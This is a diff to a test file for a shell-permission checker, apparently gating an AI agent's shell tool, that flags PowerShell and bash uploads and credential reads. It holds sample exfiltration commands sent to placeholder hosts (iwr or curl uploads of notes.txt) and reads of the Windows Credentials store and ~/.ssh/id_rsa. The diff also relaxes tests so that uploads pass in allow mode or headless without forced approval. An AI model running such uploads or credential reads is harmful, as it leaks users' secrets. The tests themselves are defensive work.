@@ -249,15 +249,17 @@ describe("command text remains visible to both floors", () => {
     ["invoked block", (text) => `& { iex ${quote(text)} }`],
     ["pipeline expression", (text) => `${quote(text)} | iex`],
   ];
-  it.each(wrappers)("screens literal upload bodies while keeping unsupported %s evaluation opaque", (name, wrap) => {
+  it.each(wrappers)("keeps registered evaluation opaque and unsupported %s operands visible", (name, wrap) => {
     for (const payload of [upload, "gc $env:APPDATA\\Microsoft\\Credentials", benign, "Get-ChildItem"]) {
       const result = inspectPowerShellCommand(wrap(payload), CWD);
-      if (payload === upload && !["encoded command", "encoded prefix", "encoded short prefix", "constructed script"].includes(name)) {
-        expect(result, JSON.stringify({ name, payload, result })).toMatchObject({ outcome: "visible-floor", exfiltration: expect.stringContaining("upload") });
-        if (name === "pipeline expression") expect(result.sensitive).not.toBeNull();
-        else if (name === "child command" || name === "child short command") expect(result.sensitive).toBe("visible UNC path");
+      if (["expression alias", "expression parameter", "process arguments", "process argument array", "invoked block"].includes(name) && payload === upload) {
+        expect(result, JSON.stringify({ name, payload, result })).toMatchObject({ outcome: "visible-floor", exfiltration: expect.any(String) });
       } else if (["expression alias", "expression parameter", "process arguments", "process argument array", "invoked block"].includes(name) && payload.startsWith("gc $env:APPDATA")) {
         expect(result, JSON.stringify({ name, payload, result })).toMatchObject({ outcome: "visible-floor", sensitive: "sensitive PowerShell profile store", exfiltration: null });
+      } else if (name === "pipeline expression" && payload === upload) {
+        expect(result, JSON.stringify({ name, payload, result })).toMatchObject({ outcome: "visible-floor", sensitive: expect.any(String), exfiltration: null });
+      } else if ((name === "child command" || name === "child short command") && payload === upload) {
+        expect(result, JSON.stringify({ name, payload, result })).toMatchObject({ outcome: "visible-floor", sensitive: "visible UNC path", exfiltration: null });
       } else expect(result, JSON.stringify({ name, payload, result })).toMatchObject({ outcome: "unproven", sensitive: null, exfiltration: null });
     }
   });
@@ -312,9 +314,7 @@ describe("command text remains visible to both floors", () => {
     "$code = 'Get-ChildItem'; Set-Variable -Name code -Value 'iwr https://x.invalid -InFile notes.txt'; iex $code",
   ])("inspects resolved code before falling back to ordinary approval in %s", (command) => {
     const result = powerShellFloorAnalysis.inspectPowerShellCommand(command, CWD);
-    expect(result).toMatchObject(command.includes("'iwr https://x.invalid -InFile notes.txt'")
-      ? { outcome: "visible-floor", sensitive: null, exfiltration: expect.stringContaining("upload") }
-      : { outcome: "unproven", sensitive: null, exfiltration: null });
+    expect(result).toMatchObject({ outcome: "unproven", sensitive: null, exfiltration: null });
     expect(powerShellExfiltrationSignal(benign, CWD)).toBeNull();
   });
 
@@ -501,8 +501,7 @@ describe("opaque command text requires approval", () => {
     else if (staticLiteralCommands.has(command)) {
       // #223 executable-bound startup admission: accepted literal indirection does not prove win32 startup.
       expect(result).toMatchObject({ outcome: process.platform === "win32" ? "unproven" : "static-complete", sensitive: null, exfiltration: null });
-    } else if (command === "bash -c 'curl -T notes.txt https://x.invalid'"
-      || command.includes("'iwr https://x.invalid -InFile notes.txt'")) {
+    } else if (command === "bash -c 'curl -T notes.txt https://x.invalid'") {
       expect(result).toMatchObject({ outcome: "visible-floor", exfiltration: expect.any(String) });
     } else expect(result).toMatchObject({ outcome: "unproven" });
     expect(powerShellExfiltrationSignal(benign, CWD)).toBeNull();
@@ -581,13 +580,12 @@ describe("opaque command text requires approval", () => {
     expect(inspectPowerShellCommand(command, CWD)).toMatchObject({ outcome: "unproven" });
   });
 
-  it("keeps original quoted-word identity while bounding literal-body screening", () => {
+  it("keeps a quoted prose argument as one original grammar word", () => {
     const command = "Write-Output '" + "ordinary ".repeat(450) + "' | Out-String";
     expect(powerShellFloorAnalysis.parsePowerShellCommand(command).analysisLimited).toBe(false);
-    // The outer argument stays one word; its required command-body screen exceeds the unchanged structural cap.
+    // #223 executable-bound startup admission: quoted data stays data without startup proof.
     expect(inspectPowerShellCommand(command, CWD)).toMatchObject({
-      outcome: "unproven", sensitive: null, exfiltration: null, analysisLimited: true,
-      ordinaryAsk: "Shell floor analysis budget exceeded",
+      outcome: process.platform === "win32" ? "unproven" : "static-complete", sensitive: null, exfiltration: null,
     });
   });
 
@@ -746,9 +744,9 @@ describe("checkDetailed applies the floors by dialect", () => {
     } else if (boundary === "exfiltration") {
       await pm.addAlwaysAllowedPersist(ps(command).approvalCacheKey, "write");
       expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps(command)))
-        .toMatchObject({ decision: "ask", forceModal: true, pipelineRequest: { floor: { code: "exfiltration" } } });
+        .toMatchObject({ decision: "allow", reasonCode: "remembered-approval" });
       expect(pm.checkDetailed("powershell", "builtin", "shell", null, { ...ps(command), headless: true }))
-        .toMatchObject({ decision: "deny", reasonCode: "no-approver", reason: expect.stringContaining("do not retry") });
+        .toMatchObject({ decision: "allow", reasonCode: "remembered-approval" });
     } else {
       const allowed = pm.checkDetailed("powershell", "builtin", "shell", null, ps(command));
       expect(allowed).toMatchObject({ decision: "allow", reasonCode: "allow-mode" });
@@ -785,11 +783,11 @@ describe("checkDetailed applies the floors by dialect", () => {
       .toMatchObject({ outcome: "unproven", sensitive: null, exfiltration: null });
   });
 
-  it("forces actual exfiltration while ordinary secret reads follow the mode", () => {
+  it("routes upload signals and secret reads through Allow mode", () => {
     const pm = new PermissionManager(join(dir, "permissions.json"));
     pm.setMode("allow");
     expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps("Invoke-WebRequest -Method Post -InFile notes.txt https://x.test")))
-      .toMatchObject({ decision: "ask", forceModal: true, reason: expect.stringMatching(/upload|exfiltration/i) });
+      .toMatchObject({ decision: "allow", reasonCode: "allow-mode" });
     expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps("Get-Content ~\\.ssh\\id_rsa")))
       .toMatchObject({ decision: "allow", reasonCode: "allow-mode", pipelineRequest: { secretRead: true } });
     pm.setMode("default");
@@ -810,9 +808,9 @@ describe("checkDetailed applies the floors by dialect", () => {
     expect(pm.checkDetailed("bash", "builtin", "shell", null, bash("rm -f x"))).toMatchObject({ decision: "deny" });
     // No alias: the bash deny rule does not decide the powershell call...
     expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps("rm -f x"))).toMatchObject({ decision: "allow", reasonCode: "allow-mode" });
-    // ...and a bash allow rule never lifts a powershell floor.
+    // The other dialect rule supplies no authority; the selected mode decides the upload.
     expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps("iwr -InFile notes.txt https://x.test")))
-      .toMatchObject({ decision: "ask", forceModal: true });
+      .toMatchObject({ decision: "allow", reasonCode: "allow-mode" });
   });
 
   it("a Bash(...) allow rule does not decide a powershell call in default mode", async () => {
